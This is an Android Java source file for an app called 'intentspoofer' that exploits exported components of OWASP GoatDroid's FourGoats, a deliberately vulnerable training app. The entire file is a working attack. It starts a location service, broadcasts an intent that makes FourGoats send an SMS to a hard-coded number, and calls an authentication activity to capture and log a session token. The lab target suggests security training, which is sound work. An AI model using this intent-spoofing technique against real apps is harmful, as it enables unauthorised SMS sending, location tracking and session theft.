package com.dolphin.intentspoofer;

import java.util.List;

import android.os.Bundle;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.view.Menu;
import android.util.Log;

public class MainActivity extends Activity {

    private static final int STATIC_INTEGER_VALUE = 45;

	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
		
        // Start FourGoats LocationService
        Intent locationServiceIntent = new Intent("org.owasp.goatdroid.fourgoats.services.LocationService");
		startService(locationServiceIntent);
		
		// Send an SMS through FourGoats exposed API
		Intent broadcastIntent=new Intent();
		broadcastIntent.setAction("org.owasp.goatdroid.fourgoats.SOCIAL_SMS");
		broadcastIntent.putExtra("phoneNumber","0034666666666");
		broadcastIntent.putExtra("message","Hi");
		sendBroadcast(broadcastIntent);
		
        // Invoke FourGoats SocialAPIAuthentication to get a session token
        Intent tokenIntent = new Intent();
        tokenIntent.setComponent(new ComponentName("org.owasp.goatdroid.fourgoats","org.owasp.goatdroid.fourgoats.activities.SocialAPIAuthentication"));
        startActivityForResult(tokenIntent, STATIC_INTEGER_VALUE);

    }
    
    @Override 
    public void onActivityResult(int requestCode, int resultCode, Intent data) {     
      super.onActivityResult(requestCode, resultCode, data); 
      switch(requestCode) { 
        case (STATIC_INTEGER_VALUE) : { 
          if (resultCode == Activity.RESULT_OK) { 
        	  Log.w("alvms", "4Goats SessionToken: " + data.getStringExtra("sessionToken"));
  
          } 
          break; 
        } 
      } 
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
